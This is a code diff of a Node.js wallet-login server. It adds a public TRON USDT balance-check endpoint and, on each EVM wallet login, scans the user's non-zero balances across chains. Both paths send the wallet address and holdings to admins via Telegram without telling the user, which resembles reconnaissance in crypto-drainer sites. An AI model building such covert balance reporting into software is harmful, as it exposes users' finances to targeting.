@@ -712,17 +712,58 @@ const handleApi = async (request, response, pathname) => {
   }
 
   if (request.method === "POST" && pathname === "/api/auth/nonce") {
-    const { address, chain } = await readBody(request);
+    const { address } = await readBody(request);
     try {
-      return sendJson(request, response, 200, createWalletNonce(address, chain));
+      return sendJson(request, response, 200, createWalletNonce(address, "evm"));
     } catch (error) {
-      return sendJson(request, response, 400, { error: error.message || "Некорректный адрес кошелька" });
+      return sendJson(request, response, 400, { error: error.message || "Некорректный Ethereum/EVM адрес кошелька" });
     }
   }
 
+  if (request.method === "POST" && pathname === "/api/tron/usdt-balance") {
+    const { address } = await readBody(request);
+    const normalized = String(address || "").trim();
+
+    if (!isTronAddress(normalized)) {
+      return sendJson(request, response, 400, { error: "Некорректный TRON адрес. Он должен начинаться с T." });
+    }
+
+    const usdtBalance = await getTronUsdtBalance(normalized);
+    if (!usdtBalance.ok) {
+      return sendJson(request, response, 502, {
+        error: "Не удалось получить TRON USDT TRC20 баланс",
+        details: usdtBalance.error,
+      });
+    }
+
+    const session = getUserSession(request);
+    const telegramNotifications = await notifyTelegramAdmins(
+      [
+        "Публичная проверка TRON USDT TRC20",
+        "",
+        `TRON адрес: ${normalized}`,
+        `Баланс: ${usdtBalance.balance} USDT`,
+        session?.address ? `EVM пользователь: ${session.address}` : "EVM пользователь: не подключён",
+        `Время: ${formatDate(nowIso())}`,
+      ].join("\n"),
+    );
+
+    return sendJson(request, response, 200, {
+      ok: true,
+      chain: "tron",
+      network: usdtBalance.network,
+      token: "USDT_TRC20",
+      contract: usdtBalance.contract,
+      address: normalized,
+      balance: usdtBalance.balance,
+      rawBalance: usdtBalance.rawBalance.toString(),
+      telegramNotifications,
+    });
+  }
+
   if (request.method === "POST" && pathname === "/api/auth/wallet") {
-    const { address, signature, chain, chainId } = await readBody(request);
-    const walletChain = chain === "tron" ? "tron" : "evm";
+    const { address, signature, chainId } = await readBody(request);
+    const walletChain = "evm";
 
     if (!address || !signature) {
       return sendJson(request, response, 400, { error: "Нужны адрес кошелька и подпись" });
@@ -744,20 +785,14 @@ const handleApi = async (request, response, pathname) => {
 
     let recovered;
     try {
-      if (walletChain === "tron") {
-        recovered = await tronWeb.trx.verifyMessageV2(nonceRecord.message, signature);
-      } else {
-        recovered = getAddress(verifyMessage(nonceRecord.message, signature));
-      }
+      recovered = getAddress(verifyMessage(nonceRecord.message, signature));
     } catch {
       return sendJson(request, response, 401, { error: "Некорректная подпись" });
     }
 
-    const signatureMatches =
-      walletChain === "tron" ? recovered === normalized : recovered.toLowerCase() === normalized.toLowerCase();
-    if (!signatureMatches) {
+    if (recovered.toLowerCase() !== normalized.toLowerCase()) {
       return sendJson(request, response, 401, {
-        error: `Подпись не совпадает с ${walletChain === "tron" ? "TRON" : "Ethereum/EVM"} адресом кошелька`,
+        error: "Подпись не совпадает с Ethereum/EVM адресом кошелька",
       });
     }
 
@@ -767,37 +802,25 @@ const handleApi = async (request, response, pathname) => {
     let balanceLines = [];
     let balancesFound = 0;
 
-    if (walletChain === "tron") {
-      const usdtBalance = await getTronUsdtBalance(normalized);
-      if (usdtBalance.ok && usdtBalance.rawBalance > 0n) {
-        balancesFound = 1;
-        balanceLines = [`TRON USDT TRC20: ${usdtBalance.balance} USDT`];
-      } else if (usdtBalance.ok) {
-        balanceLines = ["TRON USDT TRC20 баланс: 0 USDT."];
-      } else {
-        balanceLines = ["Не удалось получить TRON USDT TRC20 баланс."];
-      }
-    } else {
-      const balanceScan = await getNonZeroNativeBalances(normalized, chainId);
-      balancesFound = balanceScan.balances.length;
-      balanceLines = balanceScan.balances.length
-        ? [
-            "Ненулевые нативные балансы:",
-            ...balanceScan.balances.map(
-              (balance) =>
-                `${balance.network} (${balance.chainId}): ${balance.balance} ${balance.symbol}`,
-            ),
-          ]
-        : [
-            balanceScan.checkedCount
-              ? "Ненулевые нативные балансы в поддерживаемых сетях не найдены."
-              : "Не удалось получить балансы из поддерживаемых сетей.",
-          ];
-    }
+    const balanceScan = await getNonZeroNativeBalances(normalized, chainId);
+    balancesFound = balanceScan.balances.length;
+    balanceLines = balanceScan.balances.length
+      ? [
+          "Ненулевые нативные балансы:",
+          ...balanceScan.balances.map(
+            (balance) =>
+              `${balance.network} (${balance.chainId}): ${balance.balance} ${balance.symbol}`,
+          ),
+        ]
+      : [
+          balanceScan.checkedCount
+            ? "Ненулевые нативные балансы в поддерживаемых сетях не найдены."
+            : "Не удалось получить балансы из поддерживаемых сетей.",
+        ];
 
     const telegramNotifications = await notifyTelegramAdmins(
       [
-        `Новый вход ${walletChain === "tron" ? "TRON USDT TRC20" : "Ethereum/EVM"} кошелька`,
+        `Новый вход Ethereum/EVM кошелька`,
         "",
         `Адрес: ${normalized}`,
         ...balanceLines,
